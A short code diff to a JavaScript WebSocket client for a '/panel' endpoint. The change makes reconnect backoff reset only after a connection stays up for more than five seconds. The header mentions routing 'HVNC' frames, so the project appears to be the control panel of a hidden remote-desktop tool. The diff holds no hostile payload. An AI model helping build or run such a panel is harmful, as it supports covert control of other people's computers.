@@ -2,13 +2,18 @@
  * Native WebSocket wrapper for /panel endpoint.
  * Auto-reconnect with exponential backoff.
  * Binary HVNC frame routing via onBinaryFrame callback.
+ *
+ * FIX: Backoff only resets after a stable connection (>5s).
+ * Prevents hammer loop when server is flapping.
  */
 
 let ws = null;
 let token = null;
 let reconnectTimer = null;
 let reconnectDelay = 1000;
+let connectedAt = null; // timestamp of last successful connect
 const MAX_DELAY = 15000;
+const STABLE_CONNECTION_MS = 5000;
 
 const listeners = new Map(); // event → Set<fn>
 
@@ -43,7 +48,17 @@ function connect() {
   ws.binaryType = 'arraybuffer';
 
   ws.onopen = () => {
-    reconnectDelay = 1000;
+    connectedAt = Date.now();
+
+    // Only reset backoff if we've been stable before,
+    // or if this is a genuinely fresh connection after a long disconnect
+    if (reconnectDelay > 5000) {
+      // We've been retrying for a while — only reset if the connection holds
+      // We'll verify in onclose if this was stable
+    } else {
+      reconnectDelay = 1000;
+    }
+
     ws.send(JSON.stringify({ type: 'auth', token }));
     emit('connecting', null);
   };
@@ -93,7 +108,15 @@ function connect() {
   };
 
   ws.onclose = (ev) => {
+    const wasStable = connectedAt && (Date.now() - connectedAt > STABLE_CONNECTION_MS);
     emit('disconnected', ev);
+
+    // Only reset backoff if the connection was stable for >5s
+    // Otherwise keep escalating to prevent hammer loop
+    if (wasStable) {
+      reconnectDelay = 1000;
+    }
+
     scheduleReconnect();
   };
 
@@ -110,6 +133,7 @@ function scheduleReconnect() {
 
 export function panelConnect(authToken) {
   token = authToken;
+  reconnectDelay = 1000;
   connect();
 }
 
